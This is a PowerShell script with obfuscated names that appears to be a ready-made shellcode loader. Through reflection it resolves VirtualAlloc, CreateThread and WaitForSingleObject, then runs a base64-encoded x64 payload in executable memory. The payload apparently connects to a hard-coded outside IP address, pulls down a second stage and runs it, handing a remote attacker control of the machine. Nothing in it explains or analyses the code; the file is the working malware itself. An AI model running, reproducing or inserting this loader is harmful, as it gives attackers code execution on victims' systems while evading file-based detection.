function jN5N {
        Param ($sWx, $mwvPx)
        $jykS = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $jykS.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($jykS.GetMethod('GetModuleHandle')).Invoke($null, @($sWx)))), $mwvPx))
}

function plb {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jDYzr,
                [Parameter(Position = 1)] [Type] $ts = [Void]
        )

        $lQp = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $lQp.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $jDYzr).SetImplementationFlags('Runtime, Managed')
        $lQp.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ts, $jDYzr).SetImplementationFlags('Runtime, Managed')

        return $lQp.CreateType()
}

[Byte[]]$qIm = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAB9AL2AHLEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")

$g6 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((jN5N kernel32.dll VirtualAlloc), (plb @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $qIm.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($qIm, 0, $g6, $qIm.length)

$wx7 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((jN5N kernel32.dll CreateThread), (plb @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$g6,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((jN5N kernel32.dll WaitForSingleObject), (plb @([IntPtr], [Int32]))).Invoke($wx7,0xffffffff) | Out-Null
